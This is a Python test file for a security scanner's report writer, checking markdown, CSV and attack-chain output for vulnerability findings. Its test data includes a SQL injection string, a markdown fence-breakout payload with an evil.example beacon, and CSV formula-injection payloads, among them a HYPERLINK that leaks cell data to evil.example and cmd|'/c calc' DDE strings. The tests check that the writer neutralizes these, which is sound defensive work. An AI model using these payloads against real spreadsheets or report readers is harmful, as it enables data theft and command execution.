"""Tests for strix.report.writer artifact helpers."""

from __future__ import annotations

import csv
import json
from typing import TYPE_CHECKING, Any

import pytest

from strix.report.writer import (
    atomic_write_text,
    read_run_record,
    render_attack_chain,
    render_vulnerability_md,
    write_executive_report,
    write_run_record,
    write_vulnerabilities,
)


if TYPE_CHECKING:
    from pathlib import Path


def _sample_report(**overrides: Any) -> dict[str, Any]:
    base: dict[str, Any] = {
        "id": "vuln-0001",
        "title": "SQL Injection",
        "severity": "high",
        "timestamp": "2026-07-02 10:00:00 UTC",
        "description": "User input reaches SQL query unsanitized.",
        "impact": "Database read access.",
        "target": "https://app.example.com",
        "endpoint": "/api/login",
        "method": "POST",
    }
    base.update(overrides)
    return base


def test_read_run_record_missing_returns_empty(tmp_path: Path) -> None:
    assert read_run_record(tmp_path) == {}


def test_read_run_record_corrupt_raises(tmp_path: Path) -> None:
    record = tmp_path / "run.json"
    record.write_text("{not json", encoding="utf-8")
    with pytest.raises(RuntimeError, match="unreadable"):
        read_run_record(tmp_path)


def test_read_run_record_non_object_raises(tmp_path: Path) -> None:
    record = tmp_path / "run.json"
    record.write_text(json.dumps(["array"]), encoding="utf-8")
    with pytest.raises(TypeError, match="not an object"):
        read_run_record(tmp_path)


def test_write_and_read_run_record_round_trip(tmp_path: Path) -> None:
    payload = {"scan_id": "scan-abc", "status": "completed"}
    write_run_record(tmp_path, payload)
    assert read_run_record(tmp_path) == payload


def test_render_vulnerability_md_includes_core_sections() -> None:
    md = render_vulnerability_md(
        _sample_report(
            technical_analysis="Root cause in UserDAO.",
            poc_description="Send ' OR 1=1 --",
            remediation_steps="Use parameterized queries.",
        ),
    )
    assert "# SQL Injection" in md
    assert "**严重性：** 高危" in md
    assert "## 漏洞描述" in md
    assert "## 影响" in md
    assert "## 技术分析" in md
    assert "## 概念验证" in md
    assert "## 修复建议" in md
    assert "**接口：** /api/login" in md


def test_render_vulnerability_md_includes_copyable_burp_request() -> None:
    request = (
        "POST /api/login HTTP/1.1\r\nHost: app.example.com\r\nContent-Length: 9\r\n\r\nuser=test"
    )
    md = render_vulnerability_md(_sample_report(burp_request=request))

    assert "## Burp 复现数据包" in md
    assert f"```http\n{request}\n```" in md


def test_render_vulnerability_md_includes_dependency_fields() -> None:
    md = render_vulnerability_md(
        _sample_report(
            title="CVE-2021-23337 in lodash 4.17.20",
            severity="high",
            target="repo/package.json",
            endpoint=None,
            method=None,
            cve="CVE-2021-23337",
            cwe="CWE-94",
            cvss=7.2,
            fix_effort="trivial",
            finding_class="dependency_cve",
            evidence="**公告证据：** `CVE-2021-23337` 影响当前安装的 `lodash` 版本 `4.17.20`。",
            assumptions="Assumes lodash ships in deployed builds.",
            dependency_metadata={
                "package_name": "lodash",
                "package_ecosystem": "npm",
                "installed_version": "4.17.20",
                "fixed_version": "4.17.21",
            },
            remediation_steps="Upgrade to 4.17.21.",
        ),
    )
    assert "**组件：** lodash" in md
    assert "**组件生态：** npm" in md
    assert "**当前版本：** 4.17.20" in md
    assert "**修复版本：** 4.17.21" in md
    assert "**CWE：** CWE-94" in md
    assert "**修复成本：** 极低" in md
    assert "## 证据" in md
    assert "## 前提假设" in md


def test_render_vulnerability_md_poc_code_cannot_break_out_of_fence() -> None:
    # LLM/target-authored PoC content containing its own ``` must not close the
    # fence early and turn the injected markdown into live headings/images.
    injected = "curl x\n```\n\n## Injected Heading\n![x](https://evil.example/beacon.png)"
    md = render_vulnerability_md(_sample_report(poc_script_code=injected))
    lines = md.split("\n")
    opening = next(ln for ln in lines[lines.index("## 概念验证") + 1 :] if ln.strip())
    ticks = opening[: len(opening) - len(opening.lstrip("`"))]
    assert len(ticks) >= 4  # wider than the payload's 3-backtick run
    assert "`" not in opening.removeprefix(ticks)  # backtick run + language tag only
    assert f"\n{ticks}\n" in md  # pure-backtick closing fence of the same width
    assert injected in md  # the payload survives verbatim, inside the fence


def test_render_vulnerability_md_snippet_cannot_break_out_of_fence() -> None:
    snippet = "row = q()\n```\n## Injected"
    md = render_vulnerability_md(
        _sample_report(code_locations=[{"file": "app.py", "snippet": snippet}]),
    )
    assert (
        "  ````\n  row = q()\n  ```\n  ## Injected\n  ````"
    ) in md  # indented fence widened past the payload's ``` run


def test_write_vulnerabilities_creates_markdown_csv_and_json(tmp_path: Path) -> None:
    reports = [
        _sample_report(id="vuln-0001", severity="medium", timestamp="2026-07-02 11:00:00 UTC"),
        _sample_report(
            id="vuln-0002",
            title="Critical RCE",
            severity="critical",
            timestamp="2026-07-02 09:00:00 UTC",
        ),
    ]
    saved: set[str] = set()

    new_count = write_vulnerabilities(tmp_path, reports, saved)

    assert new_count == 2
    assert (tmp_path / "vulnerabilities" / "vuln-0001.md").exists()
    assert (tmp_path / "vulnerabilities" / "vuln-0002.md").exists()
    assert json.loads((tmp_path / "vulnerabilities.json").read_text(encoding="utf-8")) == reports

    csv_rows = list(
        csv.DictReader((tmp_path / "vulnerabilities.csv").read_text(encoding="utf-8").splitlines()),
    )
    assert [row["id"] for row in csv_rows] == ["vuln-0002", "vuln-0001"]
    assert csv_rows[0]["severity"] == "CRITICAL"


@pytest.mark.parametrize(
    "payload",
    [
        '=HYPERLINK("http://evil.example/leak?d="&A1,"View")',
        "+cmd|'/c calc'!A1",
        "@SUM(1+1)*cmd|'/c calc'!A1",
        "-2+3+cmd|'/c calc'!A1",
        "\t leading tab",
        "\r leading carriage return",
    ],
)
def test_write_vulnerabilities_csv_neutralizes_formula_injection(
    tmp_path: Path,
    payload: str,
) -> None:
    # Titles quote text from the scanned target, so a finding title can begin with
    # a spreadsheet formula trigger. csv escapes CSV syntax but not formula
    # triggers, so the cell has to be neutralized before it is written.
    write_vulnerabilities(tmp_path, [_sample_report(title=payload)], set())

    csv_rows = list(
        csv.DictReader((tmp_path / "vulnerabilities.csv").read_text(encoding="utf-8").splitlines()),
    )
    title = csv_rows[0]["title"]
    assert title.startswith("'")
    assert not title.startswith(("=", "+", "-", "@", "\t", "\r"))


def test_write_vulnerabilities_csv_preserves_payload_after_guard(tmp_path: Path) -> None:
    payload = "=1+1"
    write_vulnerabilities(tmp_path, [_sample_report(title=payload)], set())

    csv_rows = list(
        csv.DictReader((tmp_path / "vulnerabilities.csv").read_text(encoding="utf-8").splitlines()),
    )
    assert csv_rows[0]["title"] == "'=1+1"  # guard prefix only, payload intact


def test_write_vulnerabilities_csv_leaves_benign_titles_unchanged(tmp_path: Path) -> None:
    write_vulnerabilities(tmp_path, [_sample_report(title="SQL Injection in /login")], set())

    csv_rows = list(
        csv.DictReader((tmp_path / "vulnerabilities.csv").read_text(encoding="utf-8").splitlines()),
    )
    assert csv_rows[0]["title"] == "SQL Injection in /login"


def test_atomic_write_text_keeps_payload_byte_for_byte(tmp_path: Path) -> None:
    # The CSV index carries its own \r\n terminators, so newline translation would
    # turn every row ending into \r\r\n on Windows.
    payload = "a,b\r\nc,d\r\n"
    path = tmp_path / "index.csv"

    atomic_write_text(path, payload)

    assert path.read_bytes() == payload.encode("utf-8")


def test_write_vulnerabilities_skips_already_saved_ids(tmp_path: Path) -> None:
    reports = [_sample_report(id="vuln-0001")]
    saved: set[str] = {"vuln-0001"}

    new_count = write_vulnerabilities(tmp_path, reports, saved)

    assert new_count == 0
    assert not (tmp_path / "vulnerabilities" / "vuln-0001.md").exists()
    assert (tmp_path / "vulnerabilities.csv").exists()


def test_write_executive_report_writes_markdown(tmp_path: Path) -> None:
    write_executive_report(tmp_path, "Scan complete. No critical issues.")
    content = (tmp_path / "penetration_test_report.md").read_text(encoding="utf-8")
    assert content.startswith("# 安全渗透测试报告\n\n")
    assert "## 目录" not in content
    assert "Scan complete. No critical issues." in content


def test_render_attack_chain_is_a_path_not_a_table() -> None:
    report = _sample_report(
        attack_chain=[
            {"type": "入口", "label": "POST /login", "observation": "返回会话令牌"},
            {"type": "利用", "label": "GET /admin/users", "detail": "低权限令牌可访问"},
            {"type": "影响", "label": "读取其他用户数据"},
        ]
    )

    markdown = render_vulnerability_md(report)

    assert "## 攻击链路" in markdown
    assert "攻击链路视图" in markdown
    assert "    v" in markdown
    assert "[入口] POST /login" in markdown
    assert "| --- |" not in markdown
    assert render_attack_chain(report)[0] == "## 攻击链路\n"


def test_render_structured_attack_chain_uses_microfrontend_template() -> None:
    md = render_vulnerability_md(
        _sample_report(
            attack_chain=[
                {
                    "type": "entry_point",
                    "title": "浏览器入口",
                    "source": "直接访问",
                    "route": "GET /shell.html",
                    "parameters": "无",
                    "evidence": "req 1",
                },
                {
                    "type": "trust_boundary",
                    "title": "主壳 → 微前端路由分发",
                    "source": "主壳 HTML 引用的入口 JS",
                    "route": "/shell.js",
                    "framework": "qiankun",
                    "child_apps": [
                        {"path": "/orders/", "function": "订单功能", "source": "/shell.js:10"},
                    ],
                    "fallback": {
                        "prefix": "/fallback/",
                        "function": "未独立部署，回落主壳 catch-all",
                        "source": "/shell.js:20",
                    },
                    "evidence": "req 2",
                },
                {
                    "type": "input_tampering",
                    "title": "路由声明与动态加载点",
                    "redirect_chain": "/fallback/ → /orders/app.js（来源: 网络面板 / req 3）",
                    "sensitive_route": "/orders/export",
                    "route_declaration_source": "app.abc.js:1",
                    "dynamic_load_source": "app.abc.js 内 dynamic import",
                    "chunks": [{"id": "42", "file": "chunk-42.js", "source": "app.abc.js:1"}],
                    "sensitive_function": "exportData",
                    "function_definition_source": "chunk-42.js:8",
                    "parameter_source": "exportData 调用处 → format → 请求体",
                    "encoding": "无",
                    "evidence": "req 3",
                },
                {
                    "type": "aggregation_point",
                    "title": "敏感功能汇聚点",
                    "route": "/orders/export",
                    "backend_api": "POST /api/export",
                    "method": "POST",
                    "parameters_detail": [
                        {"name": "format", "position": "body", "encoding": "明文", "source": "chunk-42.js:8"},
                    ],
                    "auth": "无",
                    "description": "前端可达敏感能力，需后端鉴权/参数化校验兜底",
                    "evidence": "req 4",
                },
            ],
        ),
    )

    assert "[入口点] 浏览器入口" in md
    assert "[信任边界] 主壳 → 微前端路由分发" in md
    assert "├── /orders/   订单功能   来源: /shell.js:10" in md
    assert "└── /fallback/   未独立部署，回落主壳 catch-all   来源: /shell.js:20" in md
    assert "[输入篡改] 路由声明与动态加载点" in md
    assert "└── 42 → chunk-42.js   来源: app.abc.js:1" in md
    assert "[汇聚点] 敏感功能汇聚点" in md
    assert "[验证确认] 待补充" in md
    assert "[阻断点] 待补充" in md
    assert md.index(" 证据: req 1") < md.index(" 证据: req 2")


def test_render_http_request_and_response_as_separate_lossless_blocks() -> None:
    request = "POST /api/export HTTP/1.1\r\nHost: app.example.com\r\n\r\nformat=csv"
    response = "HTTP/1.1 200 OK\r\nX-Diagnostic: full-response\r\n\r\nreport-body"
    md = render_vulnerability_md(
        _sample_report(http_request=request, http_response=response),
    )

    assert "## HTTP 证据" in md
    assert f"### Request\n\n```http\n{request}\n```" in md
    assert f"### Response\n\n```http\n{response}\n```" in md
    assert md.index("### Request") < md.index("### Response")
    assert "full-response" in md


def test_render_vulnerability_md_surfaces_calibration_metadata() -> None:
    """Confidence, the case against the finding, and retest status are part of
    the deliverable — storing them without rendering hides the reasoning."""
    md = render_vulnerability_md(
        {
            "id": "vuln-0009",
            "title": "SSRF in URL preview",
            "severity": "high",
            "timestamp": "2026-07-02 10:00:00 UTC",
            "description": "Fetches user-supplied URLs.",
            "confidence": "medium",
            "counterevidence": "Egress appears filtered at the network layer.",
            "confidence_rationale": "Reproduced once out of three attempts.",
            "severity_change_conditions": "Critical if egress filtering is removed.",
            "remediation_steps": "Allowlist destinations.",
            "fix_verification": "Not retested.",
        }
    )

    assert "**置信度：** Medium" in md
    assert "## 反证" in md
    assert "Egress appears filtered at the network layer." in md
    assert "## 置信度依据" in md
    assert "## 严重度变化条件" in md
    assert "## 修复验证" in md
